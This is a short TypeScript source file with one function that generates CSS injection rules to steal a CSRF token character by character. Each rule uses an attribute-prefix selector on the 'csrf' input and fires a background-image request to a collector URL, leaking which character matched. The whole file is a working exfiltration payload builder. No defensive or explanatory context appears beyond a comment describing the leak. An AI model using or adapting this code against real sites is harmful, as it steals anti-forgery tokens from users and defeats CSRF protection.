interface RoundOpts {
  phase: string;
  pos: number;
  prefix: string;
  alphabet: string;
  collectorUrl: string;
}

// One CSS rule per candidate character. Only the rule whose [value^="..."]
// prefix actually matches the secret input will render, firing exactly one
// background-image request that tells the collector which character matched.
export function buildRoundCss(opts: RoundOpts): string {
  const { phase, pos, prefix, alphabet, collectorUrl } = opts;
  return alphabet
    .split("")
    .map((c) => {
      const url = `${collectorUrl}/leak?phase=${phase}&pos=${pos}&c=${c}&n=${pos}-${c}`;
      return `input[name="csrf"][value^="${prefix}${c}"]{background-image:url(${url})}`;
    })
    .join("\n");
}
